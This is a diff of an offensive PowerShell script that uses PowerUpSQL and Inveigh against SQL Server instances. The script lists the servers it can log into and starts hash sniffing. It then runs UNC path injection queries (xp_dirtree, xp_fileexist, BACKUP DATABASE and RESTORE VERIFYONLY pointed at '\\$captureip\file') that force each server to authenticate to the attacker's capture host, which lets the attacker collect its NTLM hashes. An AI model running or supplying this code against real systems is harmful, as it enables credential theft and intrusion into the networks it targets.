@@ -6,6 +6,7 @@
 #import-module .\powerupsql.psm1
 #import-module .\inveigh.ps1
 
+
 [CmdletBinding()]
 Param(
   [Parameter(Mandatory=$false)]
@@ -38,7 +39,7 @@ $AccessibleSQLServersCount = $AccessibleSQLServers.count
 Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
 Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."
 
-# Start the sniffing
+# Start sniffing
 Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
 
 # Perform unc path injection on each one
@@ -53,15 +54,11 @@ ForEach-Object{
     # Start unc path injection for each interface
     Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"
 
-    <# use local ips 
-    Get-NetIPAddress | Select-Object ipaddress | 
-    %{ 
-        $IP = $_.IPAddress
-        $IP
-        Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$IP\path'" -Verbose
-    } #>
-
-    Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\path'" -Verbose
+    # Functions executable by the Public role that accept UNC paths
+    Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\file'" | out-null	
+    Get-SQLQuery -Instance $CurrentInstance -Query "xp_fileexist '\\$captureip\file'" | out-null	
+    Get-SQLQuery -Instance $CurrentInstance -Query "BACKUP DATABASE TESTING TO DISK = '\\$captureip\file'"  | out-null	
+    Get-SQLQuery -Instance $CurrentInstance -Query "RESTORE VERIFYONLY FROM DISK = '\\$captureip\file'"  | out-null	
      
     # Sleep to give the SQL Server time to send us hashes :)
     sleep $timeout
@@ -74,9 +71,7 @@ ForEach-Object{
 }
 
 # Stop sniffing
-# Write-Output "Stopping sniffer"
 Stop-Inveigh | Out-Null 
 
 # Clear memory
-# Write-Output "Cleaning up"
 Clear-Inveigh | Out-Null 
